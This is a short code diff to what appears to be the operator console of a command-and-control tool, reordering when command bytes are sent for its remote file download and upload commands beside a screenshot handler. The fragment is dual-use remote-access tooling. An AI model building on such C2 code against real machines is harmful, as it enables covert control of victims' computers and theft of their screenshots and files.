@@ -9,7 +9,7 @@
 #include <limits.h>
 #include "c2.h"
 #include "common.h"
-#include "server/server_psh.h"
+#include "server/utils.h"
 
 #define DEFAULT_DOWNLOAD_NAME "downloaded_file.bin"
 #define DEFAULT_UPLOAD_NAME   "uploaded_file.bin"
@@ -117,6 +117,8 @@ int main() {
             printf("[+] Screenshot saved to %s (%u bytes)\n", filename, file_size);
             continue;
         } else if (strcmp(cmd, "3") == 0) {
+            if (safe_send(client_fd, "3", 1, 0) <= 0) break;
+
             char remote_path[512] = {0};
             char local_path[512] = {0};
 
@@ -128,7 +130,6 @@ int main() {
 
             if (!prompt_line("Local save path: ", local_path, sizeof(local_path))) break;
 
-            if (safe_send(client_fd, "3", 1, 0) <= 0) break;
             if (safe_send_payload(client_fd, remote_path, strlen(remote_path) + 1, 0) < 0) break;
 
             char status;
@@ -171,6 +172,10 @@ int main() {
             }
             continue;
         } else if (strcmp(cmd, "4") == 0) {
+            if (safe_send(client_fd, "4", 1, 0) <= 0) {
+                break;
+            }
+
             char local_path[512] = {0};
             char remote_path[512] = {0};
 
@@ -194,10 +199,6 @@ int main() {
                 continue;
             }
 
-            if (safe_send(client_fd, "4", 1, 0) <= 0) {
-                free(file_buffer);
-                break;
-            }
             if (safe_send_payload(client_fd, remote_path, strlen(remote_path) + 1, 0) < 0) {
                 free(file_buffer);
                 break;
